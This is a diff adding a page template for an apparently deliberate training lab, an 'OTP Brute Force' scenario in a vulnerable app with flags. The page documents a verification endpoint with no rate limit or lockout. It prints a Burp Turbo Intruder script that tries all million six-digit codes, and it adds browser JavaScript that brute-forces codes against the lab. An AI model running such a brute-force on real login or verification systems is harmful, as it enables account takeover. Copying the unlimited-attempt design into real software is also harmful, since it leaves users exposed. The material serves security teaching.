@@ -1,0 +1,122 @@
+<%- include('../partials/navbar') %>
+  <main class="main-content">
+    <div class="top-header"><span class="header-title">OTP Verification</span>
+      <div class="header-right"><a href="/otp" class="btn btn-secondary btn-sm">← OTP Lab</a>
+        <a href="/profile/<%= user.id %>" class="header-user"><div class="header-avatar"><%= ((user.first_name||user.username).charAt(0)).toUpperCase() %></div></a>
+      </div>
+    </div>
+    <div class="page-body">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;align-items:start;max-width:900px;">
+        <div>
+          <div class="card" style="border-color:var(--danger);">
+            <div class="card-header" style="background:var(--danger-bg);">
+              <h3>🔁 Scenario 1 — OTP Brute Force</h3>
+              <span class="badge badge-danger">No Rate Limit</span>
+            </div>
+            <div class="card-body">
+              <p style="font-size:13px;color:var(--text-muted);margin-bottom:16px;">A 6-digit OTP was sent to your registered phone. Enter it below to verify your identity.</p>
+              <% if(result === 'success'){ %>
+              <div class="alert alert-success">✅ OTP Verified!</div>
+              <% } else if(result === 'expired'){ %>
+              <div class="alert alert-warning">OTP expired. <a href="/otp/brute-force">Get new OTP</a></div>
+              <% } %>
+              <% if(otp_hint){ %>
+              <div style="background:var(--success-bg);border:1px solid var(--success);border-radius:var(--radius);padding:10px 14px;margin-bottom:14px;font-size:12px;">
+                🟢 Beginner Mode — OTP: <strong style="font-size:18px;letter-spacing:4px;color:var(--primary)"><%= otp_hint %></strong>
+              </div>
+              <% } %>
+              <div id="result-box" style="display:none;margin-bottom:14px;"></div>
+              <div class="form-group">
+                <label>Enter OTP</label>
+                <input type="text" id="otp-input" maxlength="6" pattern="[0-9]{6}" placeholder="000000"
+                  style="font-size:28px;letter-spacing:10px;text-align:center;font-family:monospace;" autofocus>
+              </div>
+              <div style="display:flex;gap:8px;">
+                <button onclick="verifyOTP()" class="btn btn-primary btn-lg" style="flex:1;">Verify OTP</button>
+                <a href="/otp/brute-force" class="btn btn-secondary">New OTP</a>
+              </div>
+              <div style="margin-top:12px;font-size:12px;color:var(--text-muted);">Attempts: <span id="attempt-count">0</span></div>
+            </div>
+          </div>
+        </div>
+
+        <div>
+          <div class="card" style="margin-bottom:16px;">
+            <div class="card-header"><h3>Vulnerability Details</h3></div>
+            <div class="card-body" style="font-size:12px;line-height:1.9;">
+              <table style="width:100%;">
+                <tr><td style="color:var(--text-muted);padding:3px 0;">Type</td><td><strong>OTP Brute Force</strong></td></tr>
+                <tr><td style="color:var(--text-muted);">OTP Length</td><td>6 digits (1,000,000 combinations)</td></tr>
+                <tr><td style="color:var(--text-muted);">Rate Limit</td><td><span style="color:var(--danger);font-weight:700;">None ❌</span></td></tr>
+                <tr><td style="color:var(--text-muted);">Lockout</td><td><span style="color:var(--danger);font-weight:700;">None ❌</span></td></tr>
+                <tr><td style="color:var(--text-muted);">Expiry</td><td><span style="color:var(--warning);font-weight:700;">1 hour ⚠️</span></td></tr>
+                <tr><td style="color:var(--text-muted);">Endpoint</td><td><code>POST /otp/brute-force/verify</code></td></tr>
+              </table>
+            </div>
+          </div>
+
+          <div class="card" style="margin-bottom:16px;border-color:var(--warning);">
+            <div class="card-header"><h3>⚡ Burp Turbo Intruder Script</h3></div>
+            <div class="card-body">
+              <pre style="font-size:11px;overflow-x:auto;">def queueRequests(target, wordlists):
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        concurrentConnections=50,
+        requestsPerConnection=1,
+        pipeline=False
+    )
+    for otp in range(0, 1000000):
+        engine.queue(target.req,
+          str(otp).zfill(6))
+
+def handleResponse(req, interesting):
+    if 'flag' in req.response.lower():
+        table.add(req)</pre>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-header"><h3>Python — In-Browser Demo</h3></div>
+            <div class="card-body">
+              <button onclick="runBruteForce()" class="btn btn-danger btn-sm" style="margin-bottom:10px;">▶ Run Brute Force Demo (first 100)</button>
+              <div id="bf-progress" style="font-size:11px;font-family:monospace;max-height:120px;overflow-y:auto;background:var(--page-bg);padding:8px;border-radius:var(--radius);border:1px solid var(--border);"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div><%- include('../partials/footer') %>
+<script>
+async function verifyOTP() {
+    const otp = document.getElementById('otp-input').value;
+    const r   = await fetch('/otp/brute-force/verify', {
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ otp })
+    });
+    const data = await r.json();
+    document.getElementById('attempt-count').textContent = data.attempts || '?';
+    const box = document.getElementById('result-box');
+    box.style.display = 'block';
+    if (data.success) {
+        box.innerHTML = `<div class="alert alert-success">✅ ${data.message}<br><strong style="font-family:monospace;color:var(--success)">🚩 ${data.flag}</strong></div>`;
+    } else {
+        box.innerHTML = `<div class="alert alert-danger">❌ Invalid. Attempts: ${data.attempts}</div>`;
+    }
+}
+document.getElementById('otp-input').addEventListener('keypress', e => { if(e.key==='Enter') verifyOTP(); });
+
+async function runBruteForce() {
+    const log = document.getElementById('bf-progress');
+    log.innerHTML = 'Starting brute force (first 100)...\n';
+    for (let i = 0; i < 100; i++) {
+        const otp = String(i).padStart(6,'0');
+        const r = await fetch(`/otp/brute-force/verify?otp=${otp}`);
+        const d = await r.json();
+        log.innerHTML += `${otp}: ${d.success ? '✅ FOUND! Flag: '+d.flag : '❌'}\n`;
+        log.scrollTop = log.scrollHeight;
+        if (d.success) break;
+        await new Promise(r => setTimeout(r, 10));
+    }
+}
+</script>
